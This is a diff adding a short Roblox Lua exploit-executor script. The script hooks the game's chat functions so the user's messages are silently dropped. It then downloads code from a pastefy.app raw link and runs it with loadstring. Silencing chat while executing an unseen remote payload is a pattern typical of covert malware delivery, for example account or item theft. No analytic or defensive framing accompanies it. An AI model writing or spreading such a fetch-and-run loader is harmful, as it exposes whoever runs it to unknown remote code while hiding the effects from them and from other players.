@@ -1,0 +1,19 @@
+local oldFireServer
+oldFireServer = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
+    if self.Name == "SayMessageRequest" then
+        return nil
+    end
+    return oldFireServer(self, ...)
+end))
+
+local success, textChat = pcall(function() return game:GetService("TextChatService") end)
+if success and textChat then
+    local oldSendAsync
+    oldSendAsync = hookfunction(textChat.TextChannels.RBXGeneral.SendAsync, newcclosure(function(self, ...)
+        return nil
+    end))
+end
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/iCTeYJ49/raw"))()
+end)
